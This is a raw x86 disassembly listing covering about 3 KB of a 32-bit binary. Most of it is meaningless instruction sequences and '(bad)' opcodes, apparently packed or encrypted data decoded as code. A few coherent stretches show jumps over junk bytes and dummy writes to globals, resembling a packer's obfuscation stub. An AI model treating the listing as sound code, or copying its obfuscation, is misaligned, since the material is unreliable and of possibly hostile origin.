  407bec:	add    eax,0xe95f86e1
  407bf1:	rol    DWORD PTR [eax+0x2e],0x51
  407bf5:	jle    0x407c38
  407bf7:	(bad)  
  407bf8:	jle    0x407c2b
  407bfa:	sar    DWORD PTR [esi+0x230bc94b],cl
  407c00:	popf   
  407c01:	mov    BYTE PTR [ecx+0x7a],ch
  407c04:	xchg   BYTE PTR [esp+ebx*1-0xd],ch
  407c08:	out    dx,eax
  407c09:	hlt    
  407c0a:	mov    ebp,0x64251775
  407c0f:	mov    bh,0x59
  407c11:	fwait
  407c12:	xor    BYTE PTR [ebx+edi*1+0x78c8c918],dh
  407c19:	iret   
  407c1a:	sub    eax,0x2a8eb0b6
  407c1f:	adc    eax,0xe6f66384
  407c24:	xor    dl,al
  407c26:	pusha  
  407c27:	pop    ss
  407c28:	repz push esp
  407c2a:	scas   al,BYTE PTR es:[edi]
  407c2b:	add    DWORD PTR [edx],esi
  407c2d:	mov    fs,WORD PTR [eax]
  407c2f:	mov    DWORD PTR ds:0xa538f167,0x8b675428
  407c39:	jg     0x407bbc
  407c3b:	retf   0x2d10
  407c3e:	push   edx
  407c3f:	ins    DWORD PTR es:[edi],dx
  407c40:	dec    esi
  407c41:	and    esp,DWORD PTR [edi-0x19]
  407c44:	push   esp
  407c45:	mov    al,ds:0x3f84ea4c
  407c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c4b:	arpl   bx,dx
  407c4d:	lahf   
  407c4e:	fld    st(0)
  407c50:	jl     0x407bf9
  407c52:	cmp    BYTE PTR [ecx],dl
  407c54:	xchg   esp,eax
  407c55:	cmp    al,0x98
  407c57:	call   0x80f7:0x1c2e93a8
  407c5e:	fdivr  QWORD PTR [edx+0x37cca552]
  407c64:	ins    DWORD PTR es:[edi],dx
  407c65:	in     eax,dx
  407c66:	(bad)  
  407c67:	mul    DWORD PTR [edi]
  407c69:	cmp    cl,BYTE PTR [esi-0x12]
  407c6c:	lds    esp,FWORD PTR [eax-0x2a22fcc3]
  407c72:	repnz loopne 0x407cad
  407c75:	sub    DWORD PTR [edi+0x26],edi
  407c78:	dec    eax
  407c79:	cli    
  407c7a:	or     BYTE PTR [esi-0x608fa8],bh
  407c80:	xor    DWORD PTR ds:0x54f2dcc0,edx
  407c86:	push   ds
  407c87:	imul   edx,DWORD PTR [ebx+eax*2],0xc476d45d
  407c8e:	out    dx,al
  407c8f:	mov    ah,0x3
  407c91:	push   ss
  407c92:	repnz outs dx,BYTE PTR ds:[esi]
  407c94:	outs   dx,DWORD PTR ds:[esi]
  407c95:	xor    ebx,0xdcef0d43
  407c9b:	fs cmp edx,ecx
  407c9e:	dec    esi
  407c9f:	dec    ecx
  407ca0:	mov    cs,WORD PTR [ecx]
  407ca2:	in     al,0x52
  407ca4:	push   0x535d1733
  407ca9:	sbb    eax,0x578918d2
  407cae:	jl     0x407c5d
  407cb0:	xchg   esi,eax
  407cb1:	sbb    esp,DWORD PTR [edx-0x18b35267]
  407cb7:	outs   dx,DWORD PTR ds:[esi]
  407cb8:	stos   DWORD PTR es:[edi],eax
  407cb9:	cmp    eax,0x105c7040
  407cbe:	dec    edi
  407cbf:	lock les ecx,FWORD PTR [ebx-0x2d04ffa]
  407cc6:	push   ds
  407cc7:	xchg   BYTE PTR [edx+ebp*8+0x4e],dl
  407ccb:	sbb    dl,al
  407ccd:	clc    
  407cce:	fst    DWORD PTR [ebp+0x7eb0f874]
  407cd4:	and    al,0x60
  407cd6:	mov    al,0x8c
  407cd8:	mov    cl,BYTE PTR [edx]
  407cda:	lods   eax,DWORD PTR ds:[esi]
  407cdb:	idiv   DWORD PTR [edx-0x36]
  407cde:	push   0xaebdb77f
  407ce3:	lods   al,BYTE PTR gs:[esi]
  407ce5:	push   ss
  407ce6:	sbb    al,0x1a
  407ce8:	dec    eax
  407ce9:	pop    ebx
  407cea:	inc    esi
  407ceb:	out    0x81,al
  407ced:	enter  0xce55,0xa2
  407cf1:	push   es
  407cf2:	ja     0x407ca4
  407cf4:	pop    ebp
  407cf5:	loope  0x407caf
  407cf7:	fnstenv [edx+0x3fdef28f]
  407cfd:	scas   al,BYTE PTR es:[edi]
  407cfe:	popf   
  407cff:	pop    es
  407d00:	clc    
  407d01:	ror    DWORD PTR ds:0x6d58ffdf,0x82
  407d08:	stos   DWORD PTR es:[edi],eax
  407d09:	pop    ebp
  407d0a:	outs   dx,BYTE PTR ds:[esi]
  407d0b:	mov    edi,DWORD PTR [ebp+0x58]
  407d0e:	js     0x407c97
  407d10:	stos   BYTE PTR es:[edi],al
  407d11:	mov    bh,bl
  407d13:	cld    
  407d14:	scas   al,BYTE PTR es:[edi]
  407d15:	sahf   
  407d16:	sahf   
  407d17:	jne    0x407cf7
  407d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d1a:	or     eax,0x36c79d84
  407d1f:	mov    esi,0xdf482663
  407d24:	and    eax,0x4be25b8
  407d29:	dec    edx
  407d2a:	rol    DWORD PTR [ebp-0x3],0x5a
  407d2e:	ror    DWORD PTR [esp+ebp*1],0xdb
  407d32:	xlat   BYTE PTR ds:[ebx]
  407d33:	(bad)  
  407d34:	out    dx,eax
  407d35:	xor    esi,DWORD PTR [ebp+0x127598b8]
  407d3b:	jns    0x407ccf
  407d3d:	pop    ds
  407d3e:	xchg   edx,eax
  407d3f:	imul   ebp,DWORD PTR [eax+0x6b],0xffffffe2
  407d43:	mov    ax,0xd4ba
  407d47:	adc    eax,0x59d70583
  407d4c:	call   0xb8ee33b2
  407d51:	js     0x407d55
  407d53:	out    dx,eax
  407d54:	pop    ds
  407d55:	jmp    0x5b91:0x4da05c9b
  407d5c:	in     al,dx
  407d5d:	imul   ebp,DWORD PTR [eax+eiz*8-0x31967338],0xffffffa2
  407d65:	xor    ecx,eax
  407d67:	mov    esi,0x432ee252
  407d6c:	and    dh,bh
  407d6e:	int3   
  407d6f:	inc    ebp
  407d70:	pop    esi
  407d71:	rcl    BYTE PTR [ecx],0x4f
  407d74:	xor    eax,0xa661aa63
  407d79:	add    eax,0x8ad7aad0
  407d7e:	rcl    BYTE PTR [ebp+0x4c1fbcbb],1
  407d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d85:	rcr    DWORD PTR [edi+eiz*2-0x41],cl
  407d89:	loopne 0x407d49
  407d8b:	out    dx,al
  407d8c:	xor    eax,0xcb0d943f
  407d91:	add    dh,BYTE PTR [ebp+0x22]
  407d94:	cdq    
  407d95:	jbe    0x407d56
  407d97:	test   bl,cl
  407d99:	dec    cl
  407d9b:	mov    edi,DWORD PTR [ecx-0xc]
  407d9e:	cmp    al,BYTE PTR [edx+0x2a]
  407da1:	sub    eax,0x502d2a83
  407da6:	and    BYTE PTR [edi-0x8],bh
  407da9:	pusha  
  407daa:	shl    DWORD PTR [ebp+0x4a02f5c2],1
  407db0:	enter  0xc0a7,0x1b
  407db4:	shl    DWORD PTR [eax+0x29a08c8d],cl
  407dba:	mov    dh,0xe7
  407dbc:	mov    ebx,0xc507c93f
  407dc1:	add    BYTE PTR [ebx-0x39d69c01],ch
  407dc7:	je     0x407e18
  407dc9:	aaa    
  407dca:	fs sub ebx,eax
  407dcd:	or     esp,DWORD PTR [edx]
  407dcf:	jp     0x407db1
  407dd1:	repz imul eax,DWORD PTR [esi+0x53],0x2d
  407dd6:	retf   
  407dd7:	add    dl,BYTE PTR [eax-0x22]
  407dda:	sar    esp,cl
  407ddc:	pop    ebx
  407ddd:	xor    eax,0xd643f47e
  407de2:	dec    eax
  407de3:	mov    cl,BYTE PTR [eax]
  407de5:	in     eax,0x9e
  407de7:	mov    al,0x27
  407de9:	gs jno 0x407dea
  407dec:	pop    edx
  407ded:	ins    BYTE PTR es:[edi],dx
  407dee:	sbb    al,0x22
  407df0:	pop    es
  407df1:	add    dh,0xb7
  407df4:	loope  0x407e5b
  407df6:	inc    eax
  407df7:	stos   DWORD PTR es:[edi],eax
  407df8:	ss inc ecx
  407dfa:	dec    ecx
  407dfb:	nop
  407dfc:	mov    esp,0x7708d106
  407e01:	xchg   edi,eax
  407e02:	jg     0x407de6
  407e04:	jge    0x407de7
  407e06:	iret   
  407e07:	or     ecx,DWORD PTR [edi+esi*2]
  407e0a:	inc    BYTE PTR [eax+0x7d]
  407e0d:	out    dx,al
  407e0e:	gs sti 
  407e10:	je     0x407e5d
  407e12:	(bad)  
  407e13:	dec    esi
  407e14:	loop   0x407de9
  407e16:	lods   eax,DWORD PTR ds:[esi]
  407e17:	xor    BYTE PTR [ebx],0x5a
  407e1a:	push   ss
  407e1b:	mov    cl,0x26
  407e1d:	imul   eax,DWORD PTR [ebx+0x22534609],0xa39af134
  407e27:	add    al,0x47
  407e29:	push   ebp
  407e2a:	add    eax,DWORD PTR [edx+0x49]
  407e2d:	jecxz  0x407e85
  407e2f:	pop    es
  407e30:	xchg   BYTE PTR [eax],al
  407e32:	cli    
  407e33:	ds mov bl,0x61
  407e36:	pop    ecx
  407e37:	push   edi
  407e38:	lock and al,0xd3
  407e3b:	mov    ch,0x23
  407e3d:	fiadd  WORD PTR [esi-0x41]
  407e40:	push   0xffffffb0
  407e42:	popa   
  407e43:	inc    eax
  407e44:	ins    BYTE PTR es:[edi],dx
  407e45:	inc    ebx
  407e46:	cs cs mov cl,0xfb
  407e4a:	xlat   BYTE PTR ds:[ebx]
  407e4b:	scas   eax,DWORD PTR es:[edi]
  407e4c:	(bad)  
  407e4d:	fidivr WORD PTR [edx]
  407e4f:	and    al,0x5e
  407e51:	leave  
  407e52:	scas   eax,DWORD PTR es:[edi]
  407e53:	mov    ebp,0x551d75ba
  407e58:	fnstcw WORD PTR [eax+0x6d63936b]
  407e5e:	gs loop 0x407de5
  407e61:	cmp    edi,esp
  407e63:	ret    0xbb88
  407e66:	bound  ebx,QWORD PTR [ebx]
  407e68:	out    0xd1,al
  407e6a:	test   BYTE PTR [esi],bl
  407e6c:	adc    ebx,DWORD PTR [edx-0x241507f2]
  407e72:	test   eax,0x5d53ec1f
  407e77:	dec    eax
  407e78:	cmp    DWORD PTR [esi+0x620e086d],ebx
  407e7e:	push   edx
  407e7f:	sub    esi,edi
  407e81:	bswap  esp
  407e83:	and    DWORD PTR [esi+0x59],0xffffffd1
  407e87:	sbb    bh,ah
  407e89:	pusha  
  407e8a:	and    ebx,DWORD PTR [eax+0x157c55b0]
  407e90:	cli    
  407e91:	pop    es
  407e92:	(bad)  
  407e93:	iret   
  407e94:	or     al,0x3f
  407e96:	call   0x7c82:0xb48bf27
  407e9d:	rol    cl,1
  407e9f:	ja     0x407ea5
  407ea1:	and    dl,BYTE PTR [bx+si-0x40]
  407ea5:	(bad)  
  407ea8:	out    0x27,eax
  407eaa:	frstor [edx]
  407eac:	mov    edx,0xa2eec942
  407eb1:	sbb    ch,0xa2
  407eb4:	repnz sub BYTE PTR [ebx-0xf4893ac],dl
  407ebb:	aad    0x34
  407ebd:	push   ss
  407ebe:	or     DWORD PTR [edx-0x3dbcb05],esi
  407ec4:	int3   
  407ec5:	(bad)  
  407ec6:	dec    esp
  407ec7:	sub    al,0x80
  407ec9:	mov    edi,0x761e0482
  407ece:	mov    esi,0xb9be6a56
  407ed3:	out    dx,eax
  407ed4:	mov    al,0x73
  407ed6:	inc    ebx
  407ed7:	mov    ecx,0x1e9cb419
  407edc:	push   ebx
  407edd:	mov    dl,0x1e
  407edf:	adc    al,0x73
  407ee1:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	jge    0x407f28
  407f1f:	dec    esi
  407f20:	dec    esi
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	fistp  DWORD PTR [esi+0x61]
  407f2c:	lock and DWORD PTR [ebx],0x44
  407f30:	xchg   ah,bl
  407f32:	sbb    DWORD PTR [ebp+0x4497c524],eax
  407f38:	mov    ds:0xee063eb2,eax
  407f3d:	addr16 mov ebx,ecx
  407f40:	popa   
  407f41:	je     0x407f38
  407f43:	retf   0x1410
  407f46:	daa    
  407f47:	sub    DWORD PTR [edx],0xcfad483e
  407f4d:	lahf   
  407f4e:	sar    dl,cl
  407f50:	dec    esp
  407f51:	daa    
  407f52:	ins    BYTE PTR es:[edi],dx
  407f53:	es mov ecx,0x75a4a1a6
  407f59:	shr    DWORD PTR [eax],cl
  407f5b:	or     bl,BYTE PTR ds:0x18d9c87c
  407f61:	cmp    edi,DWORD PTR [ecx+0x33b32093]
  407f67:	ret    
  407f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f69:	jae    0x407f18
  407f6b:	pop    ss
  407f6c:	cmp    esp,DWORD PTR [ecx+0x9]
  407f6f:	icebp  
  407f70:	xor    DWORD PTR [eax],edx
  407f72:	push   0x27
  407f74:	rol    BYTE PTR es:[ebx],cl
  407f77:	push   ebx
  407f78:	aas    
  407f79:	ret    0x91a5
  407f7c:	jl     0x407fa6
  407f7e:	jo     0x407f01
  407f80:	fs jl  0x407f1b
  407f83:	int    0x80
  407f85:	and    BYTE PTR ds:0xaa21c4ff,0x99
  407f8c:	pop    esp
  407f8d:	and    BYTE PTR [ebx],ah
  407f8f:	loope  0x407f29
  407f91:	cmc    
  407f92:	mov    ?,WORD PTR [ecx]
  407f94:	or     eax,0x651fbc87
  407f99:	jmp    0x407f97
  407f9b:	pop    ss
  407f9c:	enter  0x8b14,0x5e
  407fa0:	mov    dh,0xa3
  407fa2:	dec    edx
  407fa3:	jle    0x407fd4
  407fa5:	inc    eax
  407fa6:	pop    esi
  407fa7:	in     eax,0x97
  407fa9:	xor    al,0x21
  407fab:	scas   al,BYTE PTR es:[edi]
  407fac:	mov    al,ds:0x9844296e
  407fb1:	inc    esi
  407fb2:	and    eax,0xf959f332
  407fb7:	cmc    
  407fb8:	imul   esi,eax,0xd
  407fbb:	ret    0x671d
  407fbe:	push   ebx
  407fbf:	dec    edx
  407fc0:	ret    0x9291
  407fc3:	aaa    
  407fc4:	test   BYTE PTR [ebx+0x67c5640a],bh
  407fca:	pop    ebp
  407fcb:	leave  
  407fcc:	and    eax,DWORD PTR [ecx]
  407fce:	sub    al,BYTE PTR [ecx]
  407fd0:	cld    
  407fd1:	push   edx
  407fd2:	push   cs
  407fd3:	xor    ah,BYTE PTR [ebx+0x4ff0a55a]
  407fd9:	popa   
  407fda:	mov    ds:0x8ade200f,al
  407fdf:	inc    eax
  407fe0:	jecxz  0x407fb8
  407fe2:	pop    eax
  407fe3:	clc    
  407fe4:	cmp    bl,bh
  407fe6:	cld    
  407fe7:	adc    DWORD PTR [ebp+0x5a],ebp
  407fea:	xchg   DWORD PTR [esi+0x6b],esi
  407fed:	sub    DWORD PTR [eax+0xb],0xffffffba
  407ff1:	mov    esi,DWORD PTR [bx]
  407ff4:	retf   
  407ff5:	jae    0x407f88
  407ff7:	lahf   
  407ff8:	mov    ebx,0xd95fa39
  407ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffe:	pop    edi
  407fff:	gs imul eax,esi,0xfffffffc
  408003:	xor    cl,BYTE PTR [edi-0x66659890]
  408009:	mov    ecx,0x1a1a847e
  40800e:	sti    
  40800f:	mov    dh,0x34
  408011:	je     0x408038
  408013:	test   BYTE PTR [edi-0x61a5fc64],ah
  408019:	into   
  40801a:	pushf  
  40801b:	xchg   DWORD PTR [eax+0x4d],esi
  40801e:	sbb    al,0x4c
  408020:	sub    ecx,DWORD PTR [ebx+0x6a7a0baa]
  408026:	pop    ecx
  408027:	xchg   esp,eax
  408028:	in     al,0xfe
  40802a:	jo     0x407fd5
  40802c:	leave  
  40802d:	jmp    0xa309aae0
  408032:	int3   
  408033:	xchg   ebp,eax
  408034:	daa    
  408035:	pusha  
  408036:	dec    ecx
  408037:	sub    cl,al
  408039:	clc    
  40803a:	dec    ebp
  40803b:	(bad)  
  40803c:	sub    dl,BYTE PTR [esi+edi*8+0x79]
  408040:	lds    ebp,FWORD PTR [edx-0x6bffb84e]
  408046:	inc    edx
  408047:	sub    eax,0x9d89a362
  40804c:	mov    dh,0xe7
  40804e:	mov    cl,0x1d
  408050:	data16 inc bl
  408053:	ins    DWORD PTR es:[edi],dx
  408054:	dec    ebx
  408055:	xchg   DWORD PTR [ebx],ecx
  408057:	neg    dl
  408059:	cmc    
  40805a:	stos   DWORD PTR es:[edi],eax
  40805b:	icebp  
  40805c:	xchg   DWORD PTR [ebx],esi
  40805e:	jno    0x408049
  408060:	jl     0x4080a7
  408062:	(bad)  
  408063:	pop    ecx
  408064:	and    al,0x19
  408066:	popa   
  408067:	imul   ecx,DWORD PTR [edi],0x9376aa17
  40806d:	test   BYTE PTR [edx+eiz*4+0x2f],bh
  408071:	add    eax,0x2d966d62
  408076:	outs   dx,DWORD PTR ds:[esi]
  408077:	mov    eax,ds:0xea27d0c2
  40807c:	push   ebp
  40807d:	mov    ds:0x51366945,eax
  408082:	lahf   
  408083:	lods   eax,DWORD PTR ds:[esi]
  408084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408085:	jmp    0x9dfcf621
  40808a:	jle    0x4080ca
  40808c:	lds    edx,FWORD PTR [eax]
  40808e:	mov    ds:0xddfbfd7d,eax
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x8f0e08b
  40818c:	mov    dl,BYTE PTR [eax-0x1b818129]
  408192:	jg     0x408212
  408194:	jle    0x4081a3
  408196:	jl     0x4081f0
  408198:	adc    al,0xa9
  40819a:	adc    esi,DWORD PTR [eax]
  40819c:	ror    BYTE PTR ss:[ebp+edi*4-0x24],cl
  4081a1:	adc    DWORD PTR [ecx],esi
  4081a3:	xchg   BYTE PTR [esi+0x6efeee6b],dh
  4081a9:	out    dx,al
  4081aa:	and    eax,0xd0853f65
  4081af:	stc    
  4081b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081b1:	stos   BYTE PTR es:[edi],al
  4081b2:	scas   eax,DWORD PTR es:[edi]
  4081b3:	or     al,0x4d
  4081b5:	sbb    BYTE PTR [edx+ecx*1],bh
  4081b8:	jg     0x4081d0
  4081ba:	daa    
  4081bb:	inc    ebx
  4081bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081bd:	jb     0x4081eb
  4081bf:	and    eax,0xdbb85f9a
  4081c4:	pop    ss
  4081c5:	sub    esp,DWORD PTR [edx+0x437886fc]
  4081cb:	sub    eax,0x266a47be
  4081d0:	sbb    eax,0x90eb0d1c
  4081d5:	xchg   edx,eax
  4081d6:	cmp    BYTE PTR [edi],ch
  4081d8:	mov    dh,0x43
  4081da:	retf   0x2a2d
  4081dd:	int    0xaf
  4081df:	jae    0x40821f
  4081e1:	mov    ds:0x210c4718,eax
  4081e6:	fldenv [esi-0x7a7cda8a]
  4081ec:	add    BYTE PTR [esi-0x758d361],cl
  4081f2:	jo     0x408195
  4081f4:	sbb    eax,0x7b6a239f
  4081f9:	pop    esp
  4081fa:	inc    eax
  4081fb:	shr    BYTE PTR [ecx-0x72],cl
  4081fe:	cmp    esi,ebp
  408200:	xchg   edx,eax
  408201:	push   ecx
  408202:	dec    edx
  408203:	scas   al,BYTE PTR es:[edi]
  408204:	cld    
  408205:	mov    esp,esi
  408207:	mov    esi,0x9dcb0c3e
  40820c:	push   ebp
  40820d:	imul   edi,DWORD PTR [ebp-0x4],0xf973b79d
  408214:	loopne 0x408225
  408216:	test   DWORD PTR [ebx+0x57],ebp
  408219:	out    0x36,eax
  40821b:	ss call 0x6311:0x329dd928
  408223:	icebp  
  408224:	xchg   ecx,eax
  408225:	pusha  
  408226:	xchg   ebx,eax
  408227:	fcmovne st,st(4)
  408229:	xchg   ecx,eax
  40822a:	push   ds
  40822b:	inc    eax
  40822c:	jg     0x4081c0
  40822e:	ret    
  40822f:	xchg   edi,eax
  408230:	(bad)  
  408231:	ds sahf 
  408233:	bnd jns 0x4081eb
  408236:	jp     0x40820c
  408238:	jmp    0x2dcf:0xde06dc32
  40823f:	push   cs
  408240:	rcr    DWORD PTR [esi-0x2f00da5f],cl
  408246:	mov    ebx,ebx
  408248:	dec    eax
  408249:	(bad)  
  40824a:	or     BYTE PTR [ebx+0x681d9e56],ch
  408250:	add    bl,BYTE PTR [edx]
  408252:	xor    eax,0xd718b962
  408257:	xor    ebx,DWORD PTR [esi+esi*4-0x2bf295fe]
  40825e:	push   es
  40825f:	and    BYTE PTR [edx+0x7cc91a8b],bl
  408265:	lock inc ebp
  408267:	gs cs icebp 
  40826a:	std    
  40826b:	aaa    
  40826c:	(bad)  
  40826d:	cmp    DWORD PTR [eax-0xe62d3c5],0x8e32d2c4
  408277:	push   ss
  408278:	fild   QWORD PTR [edi+edi*1-0x6fc4baee]
  40827f:	ficom  WORD PTR [ebp+0x51291eb8]
  408285:	(bad)  
  408286:	into   
  408287:	and    al,0x26
  408289:	div    BYTE PTR [eax]
  40828b:	out    0x35,al
  40828d:	push   esp
  40828e:	ins    DWORD PTR es:[edi],dx
  40828f:	das    
  408290:	pop    eax
  408291:	mov    ss,WORD PTR [edx-0x7f0b977b]
  408297:	pushf  
  408298:	sahf   
  408299:	cwde   
  40829a:	fwait
  40829b:	xchg   esp,eax
  40829c:	lds    esp,FWORD PTR [ecx]
  40829e:	dec    esi
  40829f:	xchg   edx,eax
  4082a0:	lods   eax,DWORD PTR ds:[esi]
  4082a1:	cwde   
  4082a2:	cmp    eax,DWORD PTR [ecx]
  4082a4:	dec    esp
  4082a5:	dec    ecx
  4082a6:	cwde   
  4082a7:	ds stc 
  4082a9:	sbb    ebp,DWORD PTR [esi-0xe]
  4082ac:	push   esi
  4082ad:	pop    ss
  4082ae:	js     0x408290
  4082b0:	popf   
  4082b1:	xchg   esi,eax
  4082b2:	mov    dh,BYTE PTR [eax+0x3140dae6]
  4082b8:	mov    cl,0x8a
  4082ba:	dec    ecx
  4082bb:	xor    DWORD PTR [ebx+0x55],edi
  4082be:	lea    eax,[ecx-0x42d8a366]
  4082c4:	adc    BYTE PTR [ecx-0x4276d852],dl
  4082ca:	(bad)  
  4082cb:	fsubr  DWORD PTR [ebp-0x1]
  4082ce:	shl    DWORD PTR es:[edi+0xf5b47d8],0x67
  4082d6:	test   BYTE PTR [edx+0x8468c54],bl
  4082dc:	nop
  4082dd:	mov    dh,0x79
  4082df:	aaa    
  4082e0:	arpl   WORD PTR [edx-0x5c],di
  4082e3:	push   es
  4082e4:	xchg   ebx,eax
  4082e5:	retf   0x75e
  4082e8:	sub    edi,esp
  4082ea:	mov    eax,ds:0xfb489df2
  4082ef:	jno    0x408337
  4082f1:	scas   eax,DWORD PTR es:[edi]
  4082f2:	jo     0x4082f6
  4082f4:	jns    0x408362
  4082f6:	(bad)  
  4082f7:	loopne 0x4082ce
  4082f9:	mul    BYTE PTR [eax-0x3ae8ae68]
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43377f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x37a3d54c
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x408396
  40838a:	jg     0x40839a
  40838c:	mov    ebx,DWORD PTR [edi]
  40838e:	sti    
  40838f:	outs   dx,DWORD PTR ds:[esi]
  408390:	jb     0x40835d
  408392:	add    eax,0xa331cf39
  408397:	mov    ah,0x28
  408399:	mov    eax,0xa47b8e60
  40839e:	sahf   
  40839f:	(bad)  
  4083a0:	xor    al,0x19
  4083a2:	daa    
  4083a3:	out    0x16,eax
  4083a5:	das    
  4083a6:	test   BYTE PTR [edi],ah
  4083a8:	lea    edi,[ecx-0x2]
  4083ab:	lock cs dec ebp
  4083ae:	call   0x5cfe026f
  4083b3:	and    al,BYTE PTR [ebp+0x36baa638]
  4083b9:	rcl    BYTE PTR [eax],1
  4083bb:	pop    ebp
  4083bc:	fbld   TBYTE PTR [eax+0x22dcd767]
  4083c2:	sbb    ah,cl
  4083c4:	mov    ds:0x30497b9,eax
  4083c9:	rcl    BYTE PTR [ebx-0x152b524d],1
  4083cf:	push   ecx
  4083d0:	mov    ecx,0x941ef9e2
  4083d5:	mov    dl,0x8e
  4083d7:	push   ebx
  4083d8:	shr    BYTE PTR [edi+0x7cc07070],1
  4083de:	push   ds
  4083df:	stos   BYTE PTR es:[edi],al
  4083e0:	shl    DWORD PTR [ecx-0x51],0xc2
  4083e4:	jmp    0xea632412
  4083e9:	faddp  st(3),st
  4083eb:	test   eax,0x85e1d05
  4083f0:	ins    DWORD PTR es:[edi],dx
  4083f1:	outs   dx,DWORD PTR ds:[esi]
  4083f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083f3:	aas    
  4083f4:	(bad)  
  4083f5:	mov    eax,0x67cfa6b4
  4083fa:	fcmovbe st,st(5)
  4083fc:	xchg   esi,eax
  4083fd:	out    0x75,eax
  4083ff:	enter  0xa485,0x38
  408403:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408405:	clc    
  408406:	out    dx,al
  408407:	nop
  408408:	adc    DWORD PTR [ebp+0x45c2bfa3],edx
  40840e:	jmp    0x1e3d5270
  408413:	mov    ebp,0x4cf60568
  408418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408419:	pop    esi
  40841a:	icebp  
  40841b:	mov    al,ds:0x7e1a876f
  408420:	repnz popa 
  408422:	add    DWORD PTR [edx-0x64],edi
  408425:	rol    edi,1
  408427:	daa    
  408428:	mov    ecx,0xa7fd86ca
  40842d:	scas   eax,DWORD PTR es:[edi]
  40842e:	xchg   esi,eax
  40842f:	(bad)  
  408431:	mov    ah,0x5a
  408433:	sahf   
  408434:	push   eax
  408436:	aas    
  408437:	jo     0x408480
